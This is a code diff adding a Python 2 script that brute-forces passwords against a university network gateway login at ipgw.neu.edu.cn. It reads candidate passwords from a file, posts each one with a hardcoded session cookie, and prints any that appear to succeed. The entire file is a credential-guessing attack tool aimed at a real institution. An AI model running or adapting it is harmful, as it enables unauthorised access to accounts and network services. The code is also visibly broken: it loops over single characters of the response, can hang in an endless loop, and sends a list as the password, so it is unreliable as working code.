@@ -1,0 +1,62 @@
+﻿import sys,httplib,urllib,os,urlparse
+def pass_parse(uid,passwd):
+    data=urllib.urlencode({
+        "uid":uid,
+        "password":passwd,
+        "range":2,
+        "operation":"connect",
+        "timeout":1
+        })
+    var = {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "zh-CN,zh;q=0.8",
+        "Cache-Control": "max-age=0",
+        "Connection": "keep-alive",
+        "Content-Length": "68",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Cookie": "JServSessionIdipgw=02rs5k1ix1; _pk_id.10.b8a4=5ac50994b5af0ca6.1445011280.20.1445594778.1445593462.; _pk_ses.10.b8a4=*",
+        "Host": "ipgw.neu.edu.cn",
+        "Origin": "http://ipgw.neu.edu.cn",
+        "Referer": "http://ipgw.neu.edu.cn/",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
+        }
+
+    conn = httplib.HTTPConnection("202.118.1.95","80")
+
+    conn.request(method="POST",url="http://ipgw.neu.edu.cn/ipgw/ipgw.ipgw",body=data,headers=var)
+
+    response = conn.getresponse()
+
+    if response.status == 200:
+        judge=False
+        body = response.read()
+        for line in body:
+            while judge==False:
+                if ("already" in line):
+                    judge=True
+                    print "succ!"
+                    print passwd
+                    os.system("pause")
+                else:
+                    judge=False
+    else:
+        print "fail"
+    conn.close()
+
+def getPass():
+    fp = open('pass1.txt', 'r')
+    if fp == 0:
+        print "open file error!"
+        os.system("pause")
+        exit()
+    try:
+        fp_obj = fp.readlines()
+    except ValueError:
+        print "read file error!"
+        os.system("pause")
+    for line in fp_obj:
+        passwd = line.split()
+        pass_parse("",passwd)
+getPass()    
